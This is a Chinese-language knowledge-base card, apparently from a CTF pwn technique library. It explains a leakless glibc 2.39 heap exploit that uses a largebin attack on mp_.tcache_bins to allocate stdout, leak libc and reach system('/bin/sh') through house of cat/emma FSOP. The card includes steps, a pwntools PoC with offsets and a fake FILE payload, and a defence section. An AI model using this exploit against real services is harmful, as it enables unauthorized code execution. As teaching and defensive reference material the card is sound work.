---
id: binary-pwn-heap-leakless-mp-tcache-bins-stdout-fsop
title: glibc 2.39 leakless RCE：largebin attack 放大 mp_.tcache_bins 后从堆数据分配出 stdout，再以 house of cat/emma FSOP 执行 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: leakless-largebin-mp-tcache-bins-stdout-fsop
aliases:
- leakless RCE
- mp_ leakless
- largebin attack mp_.tcache_bins
- tcache 越界索引
- 直接分配 stdout
- house of cat
- house of emma
- 无泄露堆利用
tags:
- pwn
- heap
- glibc
- leakless
- largebin
- tcache
- mp
- stdout
- fsop
- house-of-cat
- house-of-emma
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V194
  verified_at: '2026-11-06T22:47:18+08:00'
  notes: 已对照原文核对：glibc 2.39、UAF/释放不清指针、add 任意偏移写、largebin attack 改写 mp_+0x68、预置 stdout 指针经 tcache 越界索引分配 stdout、0xfbad1800/0x3887 泄露（-0x204644）、house of cat+_IO_wfile_jumps+0x10 FSOP 均与原文 exp 一致；原文无图片；未复跑 PoC，其他 libc 版本偏移需重核。
---

## 一句话结论

在无 show、无任何地址泄露、glibc 2.39、保护全开的堆题里，可以先用 largebin attack 把 libc 的 `mp_.tcache_bins` 改成超大值，使 malloc 在计算 tcache 索引时越界读到堆上预置的数据，把堆里的 stdout 指针当成 tcache 表项，从而**直接分配出 `_IO_2_1_stdout_` 的地址**；改 `_flags`/`_IO_write_base` 泄露 libc 后，再在 stdout 上伪造 FILE 结构，借 `_IO_wfile_seekoff → _IO_switch_to_wget_mode → call [rax+0x18]`（house of cat + house of emma 思路）调用 `system("/bin/sh")`。

## 原理

- 题目原语：`add(size ≤ 0x6ff)` 在任意偏移写数据、`free` 后不清空指针（UAF/Double-Free），但没有任何打印/`show` 功能，因此拿不到 libc 或堆地址；Full RELRO、PIE、Canary、NX 全开，glibc 2.39（`__free_hook`/`__malloc_hook` 已移除）。
- `tcache_perthread_struct` 是堆起始处的结构：`uint16_t counts[64]` + `tcache_entry *entries[64]`，共 0x280 字节。`mp_`（`malloc_par`）里的 `tcache_bins` 默认是 64，malloc 只在 `tc_idx < mp_.tcache_bins` 时走 tcache。
- 把 `mp_.tcache_bins` 改成超大值后，malloc 对很大的 size 也会计算一个越界的 `tc_idx`，并去读 `counts[tc_idx]`/`entries[tc_idx]`；这些地址落到 `tcache_perthread_struct` 之后、由攻击者控制的堆块数据上。只要在那个偏移放一个 stdout 指针并让 `counts[tc_idx]` 非零，`tcache_get` 就会把这个 stdout 指针当作 chunk 返回——无需知道 libc 基址。
- 要改 `mp_.tcache_bins` 需要先有一个 libc 指针可做 2 字节局部覆盖：free 一个大于 tcache 阈值的 chunk 进入 unsorted bin，其 `fd/bk` 是 `main_arena` 附近地址；攻击者对该指针低 2 字节做部分覆盖，使其指向 `stdout_`（偏移 0xf5c0）或 `mp_`（0xe180）。libc 基址页对齐使低 12 位固定，只有第 12–15 位随机，因此按 2 字节覆盖的成功率为 1/16，可重启进程爆破。
- largebin attack（glibc ≥ 2.31）可以向目标地址写入一个堆指针：把 largebin chunk 的 `bk_nextsize` 改成 `目标地址 - 0x20`，再插入一个更小的 chunk 触发链表更新；本例目标是 `mp_ + 0x68 - 0x20`（即 `mp_->tcache_bins` 所在位置）。
- tcache 索引越界后返回 stdout：`malloc` 会把 `entries[tc_idx]` 当作 `tcache_entry*`，`entries[tc_idx]->next` 被写回槽位；因此堆上预置的指针必须是可读的，且该地址（stdout）在可写映射内。返回后写入 `_IO_FILE` 头部即可。
- 泄露 libc：把 stdout 的 `_flags` 改成 `0xfbad1800`（或 `0xfbad3887`），清零 `_IO_read_ptr/_IO_read_end/_IO_read_base`，把 `_IO_write_base` 低字节改小，使 `[write_base, write_ptr)` 覆盖 libc 内存；下一次 `puts`/flush 会输出该窗口，从泄露值减去 `_IO_2_1_stdout_`/stdin 偏移得到 libc 基址（本例泄露值 - 0x204644）。
- FSOP：第二次写 stdout 时构造假 FILE。`puts` 走 `_IO_sputn`，将 vtable 设为 `_IO_wfile_jumps + 0x10`（house of emma：让 vtable 指针落在合法 `__io_vtables` 段内，绕过 vtable 校验）；`_IO_wfile_seekoff` 在满足 `write_base < write_ptr` 时调用 `_IO_switch_to_wget_mode`，后者执行 `call qword ptr [rax + 0x18]`，其中 `rax = [[stdout + 0xa0] + 0xe0]`。令 `stdout+0xa0 = stdout`、`stdout+0xe0 = stdout`，则调用的是 `stdout+0x18` 处写入的函数指针；把 `stdout+0x18` 设为 `system`，stdout 起始处写 `"/bin/sh\0"`，`+0x20` 写一个大值满足比较条件，即可 `system("/bin/sh")`。
- 为什么优于 house of water：house of water 要通过伪 chunk 合并让 `tcache_perthread_struct` 里出现 libc 地址，再做 2 字节覆盖并改 stdout；本技巧只需极少次分配即可把 stdout 分配出来，流程更短，但同样依赖 1/16 的局部覆盖爆破和可触发 largebin attack 的堆漏洞。

## 触发条件

- 目标使用 glibc 2.31+（本例 2.39），无 `__free_hook`/`__malloc_hook` 可用；Full RELRO/PIE/Canary/NX 全开也不影响本路线。
- 程序提供：可申请任意（或较大）size、可在 chunk 内任意偏移写、可 free 且释放后不清指针（UAF/Double-Free/任意 free 之一），但**没有 show/打印**，无法直接泄露地址。
- 能制造 largebin chunk 并触发 largebin attack（需要 largebin 与 unsorted bin 的重叠/伪造 size，或等效的任意写原语）。
- 可接受 1/16 的地址爆破（进程可重启，或远程服务 fork 后 ASLR 不变）。
- 程序最终会调用 stdout 输出（`puts`/`printf`/菜单），用于触发泄露和 FSOP。

## 利用步骤

1. 在堆起始区域预置两个 stdout 指针：先申请一个 0x6f8 chunk 作为预留，再申请 0x18 chunk，free 后用 `p16(stdout_低2字节)` 覆盖其内容；再申请 0x6f8-0x20 的 chunk 并写入同样的 `p16(stdout_)`。这两个指针将在 tcache 越界索引时被当作 `entries[tc_idx]`。
2. 堆风水：申请 16 个 0xf8 chunk 作为填充并依次释放，制造 unsorted bin 大块；放置 barrier、0x418 的 unsortedbin 组件和 0x18 隔离块。
3. 构造 largebin 与 unsortedbin 重叠：申请 `0x4c8-0x20` 的 padding，再申请 `0x428+0x20` 的 large chunk 并释放；通过 UAF 在 large chunk 的 `+0x10` 处伪造下一个 chunk 的 size（0x430/0x440/0x11 等），并把 largebin chunk 的 size 改成 0x431；随后释放 padding，使 0x430 chunk 落入一个大 unsorted chunk 内形成重叠。
4. 申请合适大小把 largebin chunk 排入 largebin，再释放 0x418 的 unsorted 组件；用 UAF 把 largebin chunk 的 `nextsize_bk` 低 2 字节改成 `mp_ + 0x68 - 0x20`（`mp_->tcache_bins` 目标）。
5. 触发 largebin attack：申请 0x6f0 的 chunk，使 `mp_->tcache_bins` 被写成一个很大的堆地址/数值（示例中从 64 变为 93824992262752）。
6. 为 tcache 的 count 字段做准备：申请 0x18/0x28/0x38 的 chunk 并释放，使越界索引读到的 `counts[tc_idx]` 非零。
7. 申请 0x438 或 0x478 的 chunk（对应预置指针的大小），malloc 会返回 stdout 地址；向该地址写入 `_flags=0xfbad3887/0xfbad1800`、清零读指针、调整 `_IO_write_base`，然后读取 `puts` 输出，计算 libc 基址（泄露值 - 0x204644）。
8. 构造假 IO 结构并写入 stdout：`0x00="/bin/sh\0"`、`0x18=system`、`0x20=stdout`（大值满足 `write_base < write_ptr`）、`0x88=stdout+8`（lock）、`0xa0=stdout`（_wide_data）、`0xc0=0`（mode）、`0xd8=_IO_wfile_jumps+0x10`、`0xe0=stdout`（_wide_vtable）。
9. 触发任意 stdout 输出（`puts`/菜单），经 `_IO_wfile_seekoff → _IO_switch_to_wget_mode → call [stdout+0x18]` 执行 `system("/bin/sh")`。
10. 调试时可用 `setarch $(uname -m) -R zsh` 对单个 shell 禁用 ASLR，避免每次手工爆破；远程利用时保留 1/16 重试逻辑。

## PoC

以下为关键片段（完整 exp 见原文；偏移按该题 glibc 2.39 libc 核对）：

```python
mp_ = 0xe180
stdout_ = 0xf5c0

# 1) 预置 stdout 指针
target = add(0x6f8, 0, b"reserved")
add(0x18, 0, b"aaa"); dele(target)
add(0x18, 0, p16(stdout_))
add(0x6f8 - 0x20, 0, p16(stdout_))

# 2) 堆风水 + 伪造 large chunk（略，见步骤 2-3）
# 3) largebin attack 改写 mp_->tcache_bins
dele(la_u)
dele(idxs[11])
add(0xf8, 0xa8 + 0x20, p16(mp_ + 0x68 - 0x20))
add(0x6f0, 0, b"111")

# 4) 分配出 stdout 并泄露 libc
dele(res1); dele(res2); dele(res3)
add(0x438, 0, pack(0xfbad3887) + pack(0) * 3 + p8(0))
leak = unpack(r(8))
libc.address = leak - 0x204644

# 5) 伪造 FILE + house of cat/emma FSOP
fp = libc.sym._IO_2_1_stdout_
io_payload = flat({
    0x00: b"/bin/sh\x00",
    0x18: pack(libc.sym.system),
    0x20: pack(fp),
    0x88: pack(fp + 8),
    0xa0: pack(fp),
    0xc0: pack(0),
    0xd8: pack(libc.sym._IO_wfile_jumps + 0x10),
    0xe0: pack(fp),
}, filler=b"\x00")
add(0x478, 0, io_payload)
```

原文在 glibc 2.39、2.39 偏移 `mp_=0xe180`、`stdout_=0xf5c0`、泄露偏移 `0x204644` 下打通；未在本库复跑，其他 libc 版本必须重新核对偏移与 tcache 结构布局。

## 变体与关联

- 同一首段、不同尾段：用 tcache poisoning 把栈返回地址改为 ROP 链（见 `binary-pwn-heap-largebin-attack-mp-tcache-bins-stack-rop`）；本卡尾段改为 stdout FSOP，适合没有栈地址泄露/环境受限的情况。
- house of water：经典 leakless 路线，通过伪造 chunk 合并把 arena 地址写进 `tcache_perthread_struct`；本卡改为 largebin attack 改 `mp_.tcache_bins`，分配次数更少。
- FSOP 变体：`_IO_list_all`/`_IO_2_1_stderr_` 伪造（见 `binary-pwn-heap-house-of-apple-2-stderr-fsop`、`binary-pwn-heap-house-of-orange-unsortedbin-io-list-all-fsop-system`）；house of cat 的调用链也可换其他 vtable 偏移（house of emma）。
- stdout 局部覆盖泄露的通用原理见 `binary-pwn-heap-stdout-partial-overwrite-libc-leak`；本卡复用该泄露窗口，但“如何拿到 stdout 的分配”不同。
- 关联：largebin attack 基础（`binary-pwn-heap-largebin-attack-glibc231-middle-insert-checks`）；tcache 安全机制（`binary-pwn-heap-glibc243-tcache-key-bypass-got-system`）。

## 检测与防御

- 代码层：free 后立即置空指针，杜绝 UAF/Double-Free；对 size、写入偏移做严格边界检查（本例 `size - size2` 与 `size2` 的校验看似存在，但仍允许写到 chunk 末尾并操纵相邻 size）；不要提供“任意偏移写 + 释放不清空”的组合。
- 分配器层：保持 glibc 更新（safe-linking、tcache key 只能提高部分门槛，本手法改的是 `mp_` 与 tcache 索引逻辑，不依赖覆盖 next 指针的低层编码）；可用 `MALLOC_CHECK_`、ASAN、Scudo/Hardened malloc 增加检测。
- 运行层：远程服务使用 fork-server 会固定 ASLR，放大 1/16 爆破；可改为每次连接重新 exec、启用 ASLR 并监控异常重启；对关键服务启用 seccomp，减少 `system` 可用面。
- 检测信号：进程异常退出/重连率升高（1/16 爆破特征）；堆内存出现对 `mp_`/`tcache_perthread_struct` 附近的异常写；stdout 的 `_flags` 被改为 `0xfbad1800/0x3887`；vtable 指向 `_IO_wfile_jumps` 附近等。
- 防御边界：Full RELRO/PIE/Canary/NX 不足以阻止该路线；必须从漏洞原语（UAF/任意写/未清空指针）和分配器加固入手。
